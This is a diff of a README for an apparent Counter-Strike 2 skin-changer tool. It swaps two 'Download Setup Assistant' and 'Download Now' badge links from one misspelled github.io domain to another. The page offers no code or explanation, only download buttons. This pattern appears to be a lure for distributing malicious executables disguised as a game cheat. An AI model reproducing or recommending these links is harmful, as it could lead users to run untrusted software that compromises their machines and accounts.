@@ -1,7 +1,7 @@
 # 🎯 Best SkinChanger for CS2 — Visual Loadout Customizer for Weapon & Glove Skins and more...
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-green?style=for-the-badge)](https://cs2lskin1changerrweb0.github.io/.github/)  
-[![Download Now](https://img.shields.io/badge/Download_Now-blue?style=for-the-badge&logo=counter-strike)](https://cs2lskin1changerrweb0.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-green?style=for-the-badge)](https://sk1nchangerforcs24pc.github.io/.github/)  
+[![Download Now](https://img.shields.io/badge/Download_Now-blue?style=for-the-badge&logo=counter-strike)](https://sk1nchangerforcs24pc.github.io/.github/)
 
 ---
 
